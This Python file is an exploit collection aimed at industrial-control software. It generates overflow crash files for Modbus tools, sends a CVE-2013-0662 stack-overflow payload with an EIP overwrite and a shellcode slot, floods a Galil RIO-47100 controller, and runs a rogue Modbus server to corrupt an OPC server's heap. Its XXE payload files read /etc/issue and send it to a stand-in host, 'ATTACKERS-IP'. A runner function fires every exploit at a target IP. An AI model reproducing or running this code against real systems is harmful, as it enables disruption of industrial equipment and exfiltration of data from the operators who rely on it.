import socket
import struct
from colorama import Fore
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException

def modbus_slave_dos():
    exploit = 'A' * 736
    try:
        with open("Modbus.txt", "w") as file:
            file.write(exploit)
        print("POC is created")
    except Exception as e:
        print(f"POC not created: {e}")

def cve_2018_18759():
    buffer = "A" * 603
    try:
        with open("sie.txt", "w") as f:
            print(f"[+] Creating {len(buffer)} bytes evil payload..")
            f.write(buffer)
        print("[+] File created!")
    except Exception as e:
        print(f"File cannot be created: {e}")

def modbus_slave_registration_key_dos():
    buffer = "A" * 4000
    try:
        with open("exploit.txt", "w") as f:
            print(f"[+] Creating {len(buffer)} bytes evil payload..")
            f.write(buffer)
        print("[+] File created!")
    except Exception as e:
        print(f"File cannot be created: {e}")

def cve_2013_0662_variant1(ip, port):
    con = (ip, port)
    message_header = "\x00\x64"
    message_buffer = "A" * 0x5dc
    eip = struct.pack("<I", 0x7C9C167D)

    nopsleed = "\x90" * 100
    shellcode  = ("<your_shellcode_here>")

    message = message_header + message_buffer + eip + nopsleed + shellcode
    print(f"Message Len: {hex(len(message))} bytes")

    header_padding = "\x42\x42"
    header_buf_size = "\xFF\xFF"
    header_recv_len = struct.pack(">H", len(message))
    header_end = "\x44"

    header = header_padding + header_buf_size + header_recv_len + header_end

    payload = header + message
    print(f"Package Len: {hex(len(payload))} bytes")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(con)
    s.send(payload)

def cve_2013_0662_variant2(ip, port):
    con = (ip, port)
    header_padding = "\x00\xAA"
    header_buffer_size = "\xFF\xFF"
    header_recv_len = "\x08\xDD"
    header_end = "\xFF"

    header = header_padding + header_buffer_size + header_recv_len + header_end
    message = "\x00\x64" + "A" * 2267

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(con)
    s.send(header)
    s.send(message)

def create_evil_xml():
    evil_xml_content = """<!ENTITY % data SYSTEM "file:///etc/issue">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://ATTACKERS-IP:9999/?%data;'>">
"""
    with open("evil.xml", "w") as f:
        f.write(evil_xml_content)
    print("evil.xml created")

def create_xxe_xmpa():
    xxe_xmpa_content = """<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://ATTACKERS-IP:9999/evil.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
<!DOCTYPE modbuspal_automation SYSTEM "modbuspal.dtd">
<modbuspal_automation>
<automation name="temp" step="1.0" loop="true" init="0.0">
</automation>
</modbuspal_automation>
"""
    with open("xxe.xmpa", "w") as f:
        f.write(xxe_xmpa_content)
    print("xxe.xmpa created")

def galil_rio_47100_dos(ip, port):
    new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    new.connect((ip, port))
    new.send(b'\x00\x01\x00\x00\x00\x06\x01\x01\x00\x00\x00\x01' * 100)

def modbus_opc_heap_corruption():
    port = 502
    resp = b"\x00\x00\x00\x00\x00\x06\xff\x2b\x0e\x03\x00"

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(("", port))
        sock.listen(1)
        conn, addr = sock.accept()
        print(f"OPC server at {addr[0]} connected")

        req = conn.recv(32)
        print(f"<-- {req.hex()}")

        conn.send(resp)
        print(f"--> {resp.hex()}")
        conn.close()
        print("finished, check server")
    except Exception as e:
        print(e)

def run_exploits(ip, port, unit):
    print("Running exploits...")
    try:
        # Run each exploit
        modbus_slave_dos()
        cve_2018_18759()
        modbus_slave_registration_key_dos()
        cve_2013_0662_variant1(ip, port)
        cve_2013_0662_variant2(ip, port)
        create_evil_xml()
        create_xxe_xmpa()
        galil_rio_47100_dos(ip, port)
        modbus_opc_heap_corruption()
    except Exception as e:
        print(Fore.RED + f"Exploit failed: {e}")
